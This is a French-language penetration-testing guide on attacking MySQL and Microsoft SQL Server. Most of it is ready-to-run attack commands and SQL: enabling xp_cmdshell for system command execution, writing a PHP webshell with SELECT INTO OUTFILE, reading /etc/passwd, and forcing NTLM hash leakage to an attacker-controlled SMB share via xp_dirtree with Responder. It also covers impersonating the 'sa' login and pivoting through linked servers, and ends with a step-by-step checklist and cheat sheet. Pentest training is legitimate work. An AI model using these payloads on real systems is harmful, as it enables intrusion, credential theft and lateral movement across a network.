# Attaquer les bases de données SQL

MySQL et Microsoft SQL Server (MSSQL) sont les deux SGBD relationnels les plus répandus en entreprise. Ils stockent des données critiques (identifiants, PII, données métier) et tournent souvent avec des privilèges élevés. Un accès à la base de données peut mener à la lecture de fichiers sensibles, l'exécution de commandes système, la capture de hash et le mouvement latéral via des serveurs liés.

## Pourquoi

Les serveurs de bases de données sont des cibles à haute valeur. Ils contiennent fréquemment des identifiants réutilisés, des données personnelles exploitables en ingénierie sociale, et des configurations qui révèlent l'architecture interne du réseau. De plus, MSSQL offre des fonctionnalités natives (`xp_cmdshell`, impersonation, linked servers) qui permettent de pivoter directement depuis la base vers le système d'exploitation.

## Comment ça marche

### Ports et énumération

| Service | Port par défaut | Port alternatif |
|---|---|---|
| MSSQL | TCP/1433 | TCP/2433 (mode caché) |
| MySQL | TCP/3306 | Variable |

```bash
# - Scan des services SQL
nmap -Pn -sCV -p1433,3306 <IP_CIBLE>
```

Le scan Nmap révèle la version, le hostname, le domaine (pour MSSQL via NTLM info), et parfois le nom de l'instance.

### Modes d'authentification

**MSSQL** supporte deux modes :
- **Windows Authentication** (par défaut) : les comptes Windows/AD sont directement autorisés. Pas de mot de passe SQL séparé
- **Mixed Mode** : authentification Windows ET comptes SQL locaux (login/password stockés dans SQL Server)

**MySQL** utilise principalement l'authentification par nom d'utilisateur et mot de passe. Un plugin existe pour l'authentification Windows.

{% hint style="info" %}
Quand on se connecte à MSSQL, le domaine dans le login détermine le type d'authentification. `utilisateur@<IP>` utilise l'auth SQL, `DOMAINE\utilisateur@<IP>` ou `.\utilisateur@<IP>` utilise l'auth Windows. Sur impacket, ajouter `-windows-auth` pour forcer l'auth Windows.
{% endhint %}

### Connexion aux bases

{% tabs %}
{% tab title="MySQL" %}
```bash
# - Connexion MySQL depuis Linux
mysql -u utilisateur -p -h <IP_CIBLE>
```
{% endtab %}
{% tab title="MSSQL (mssqlclient)" %}
```bash
# - Connexion MSSQL avec Impacket
mssqlclient.py utilisateur@<IP_CIBLE> -p 1433

# - Avec authentification Windows
mssqlclient.py DOMAINE/utilisateur@<IP_CIBLE> -windows-auth
```
{% endtab %}
{% tab title="MSSQL (sqsh)" %}
```bash
# - Connexion MSSQL avec sqsh
sqsh -S <IP_CIBLE> -U utilisateur -P 'MotDePasse' -h

# - Avec authentification Windows (compte local)
sqsh -S <IP_CIBLE> -U .\utilisateur -P 'MotDePasse' -h
```
{% endtab %}
{% endtabs %}

### Commandes SQL de base

{% tabs %}
{% tab title="MySQL" %}
```sql
-- Lister les bases
SHOW DATABASES;

-- Sélectionner une base
USE nom_base;

-- Lister les tables
SHOW TABLES;

-- Afficher le contenu d'une table
SELECT * FROM utilisateurs;
```
{% endtab %}
{% tab title="MSSQL" %}
```sql
-- Lister les bases
SELECT name FROM master.dbo.sysdatabases
GO

-- Sélectionner une base
USE nom_base
GO

-- Lister les tables
SELECT table_name FROM nom_base.INFORMATION_SCHEMA.TABLES
GO

-- Afficher le contenu d'une table
SELECT * FROM utilisateurs
GO
```
{% endtab %}
{% endtabs %}

### Exécution de commandes

**MSSQL : xp_cmdshell**

La procédure stockée `xp_cmdshell` permet d'exécuter des commandes système directement depuis SQL Server. Elle est désactivée par défaut mais peut être réactivée avec les droits sysadmin :

```sql
-- Activer xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- Exécuter une commande
xp_cmdshell 'whoami'
GO
```

**MySQL : écriture de webshell**

MySQL ne dispose pas d'équivalent à `xp_cmdshell`, mais si `secure_file_priv` est vide et que l'utilisateur a le privilège `FILE`, on peut écrire un fichier dans le répertoire web :

```sql
-- Écrire un webshell PHP
SELECT "<?php echo shell_exec($_GET['c']);?>"
INTO OUTFILE '/var/www/html/cmd.php';
```

### Lecture de fichiers

{% tabs %}
{% tab title="MSSQL" %}
```sql
-- Lire un fichier local
SELECT * FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents
GO
```
{% endtab %}
{% tab title="MySQL" %}
```sql
-- Lire un fichier local (nécessite FILE privilege)
SELECT LOAD_FILE("/etc/passwd");
```
{% endtab %}
{% endtabs %}

### Capture de hash via MSSQL

MSSQL peut être forcé à s'authentifier vers un partage SMB contrôlé par l'attaquant, exposant ainsi le hash NTLMv2 du compte de service SQL :

```sql
-- Forcer une authentification SMB
EXEC master..xp_dirtree '\\<IP_ATTAQUANT>\partage\'
GO
```

Côté attaquant, capturer le hash avec Responder ou impacket-smbserver :

```bash
# - Lancer un serveur SMB pour capturer le hash
sudo impacket-smbserver partage ./ -smb2support

# - Ou utiliser Responder
sudo responder -I tun0
```

Le hash capturé peut être cracké (hashcat mode 5600) ou relayé.

{% hint style="success" %}
Cette technique fonctionne même avec un accès SQL à bas privilèges. `xp_dirtree` et `xp_subdirs` ne nécessitent pas les droits sysadmin. C'est un excellent moyen d'obtenir le hash du compte de service MSSQL.
{% endhint %}

### Impersonation d'utilisateurs

MSSQL permet à un utilisateur d'agir temporairement avec les droits d'un autre via le privilège `IMPERSONATE` :

```sql
-- Identifier les comptes qu'on peut impersonner
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Vérifier si on est sysadmin
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Impersonner un autre utilisateur
EXECUTE AS LOGIN = 'sa'
GO

-- Vérifier le nouveau contexte
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Revenir au contexte initial
REVERT
GO
```

{% hint style="warning" %}
Il est recommandé d'exécuter `EXECUTE AS LOGIN` dans la base `master`, car tous les utilisateurs y ont accès par défaut. Impersonner un utilisateur dans une base où il n'a pas d'accès provoquera une erreur.
{% endhint %}

### Serveurs liés (Linked Servers)

MSSQL peut être configuré avec des serveurs liés, permettant d'exécuter des requêtes sur d'autres instances SQL. Si le compte de liaison a les droits sysadmin sur le serveur distant, on peut pivoter :

```sql
-- Lister les serveurs liés
SELECT srvname, isremote FROM sysservers
GO

-- Exécuter une commande sur un serveur lié
EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [SERVEUR\INSTANCE]
GO

-- Si sysadmin sur le lié : activer xp_cmdshell à distance
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE') AT [SERVEUR\INSTANCE]
GO
EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [SERVEUR\INSTANCE]
GO
EXECUTE('xp_cmdshell ''whoami''') AT [SERVEUR\INSTANCE]
GO
```

{% hint style="info" %}
Pour les requêtes sur un serveur lié, les guillemets simples doivent être doublés dans la chaîne `EXECUTE()`. Pour exécuter plusieurs commandes, les séparer par des points-virgules.
{% endhint %}

## En pratique

```bash
# 1 - Scan des ports SQL
nmap -Pn -sCV -p1433,3306 <IP_CIBLE>

# 2 - Connexion (tester avec identifiants par défaut ou connus)
mssqlclient.py sa@<IP_CIBLE> -p 1433
# ou
mysql -u root -h <IP_CIBLE>

# 3 - Énumérer les bases et tables
# MySQL: SHOW DATABASES; USE <base>; SHOW TABLES;
# MSSQL: SELECT name FROM master.dbo.sysdatabases

# 4 - Chercher des identifiants dans les tables
# SELECT * FROM users; SELECT * FROM credentials;

# 5 - Tester xp_cmdshell (MSSQL)
# xp_cmdshell 'whoami'

# 6 - Capturer le hash du service SQL
# EXEC master..xp_dirtree '\\<IP_ATTAQUANT>\partage\'

# 7 - Vérifier l'impersonation et les serveurs liés
# SELECT ... WHERE permission_name = 'IMPERSONATE'
# SELECT srvname FROM sysservers
```

## Pièges et galères

{% tabs %}
{% tab title="Connexion" %}
- **Auth Windows vs SQL** : sur `mssqlclient.py`, oublier `-windows-auth` quand on utilise un compte Windows résulte en un échec silencieux. Toujours préciser le type d'auth
- **sqsh pas installé** : sur votre machine d'attaque, `mssqlclient.py` d'impacket est généralement disponible et plus simple à utiliser que sqsh
- **MySQL refuse la connexion distante** : par défaut, MySQL n'écoute que sur localhost (`bind-address = 127.0.0.1`). Si le port est ouvert mais que la connexion est refusée, le compte peut être restreint à `localhost`
{% endtab %}
{% tab title="Exploitation" %}
- **xp_cmdshell désactivé** : même en sysadmin, certains administrateurs suppriment la procédure au lieu de la désactiver. Dans ce cas, `sp_configure` ne suffit pas
- **secure_file_priv** : sur MySQL, si cette variable pointe vers un répertoire spécifique (pas vide), l'écriture n'est possible que dans ce répertoire. Si elle vaut `NULL`, l'import/export est totalement désactivé
- **Impersonation en chaîne** : sur MSSQL, l'impersonation ne traverse pas les serveurs liés. Il faut vérifier les droits séparément sur chaque serveur
{% endtab %}
{% endtabs %}

## Retour terrain

Les bases de données SQL sont des cibles fréquentes en pentest. Les identifiants par défaut (`sa` sans mot de passe, `root` sans mot de passe) sont plus rares qu'avant, mais les mots de passe faibles sur les comptes SQL restent courants.

La capture de hash via `xp_dirtree` est une technique sous-estimée qui fonctionne même avec un accès bas niveau. En environnement Windows/AD, le compte de service MSSQL a souvent des privilèges intéressants sur d'autres machines du domaine.

Les serveurs liés sont un vecteur de pivotement puissant mais rarement exploité par les attaquants novices. Toujours vérifier `sysservers` une fois connecté à une instance MSSQL.

## Mémo express

| Technique | Outil / Commande | Prérequis |
|---|---|---|
| Connexion MySQL | `mysql -u user -p -h <IP>` | Identifiants valides |
| Connexion MSSQL | `mssqlclient.py user@<IP>` | Identifiants valides |
| Exécution de commandes | `xp_cmdshell 'cmd'` | Sysadmin sur MSSQL |
| Webshell MySQL | `SELECT INTO OUTFILE` | `FILE` privilege + `secure_file_priv` vide |
| Lecture de fichiers | `OPENROWSET` / `LOAD_FILE` | Droits suffisants |
| Capture de hash | `xp_dirtree '\\attaquant\share'` | Accès SQL (bas niveau suffit) |
| Impersonation | `EXECUTE AS LOGIN = 'sa'` | Privilège `IMPERSONATE` |
| Linked servers | `EXECUTE(...) AT [serveur]` | Accès au serveur lié |

***
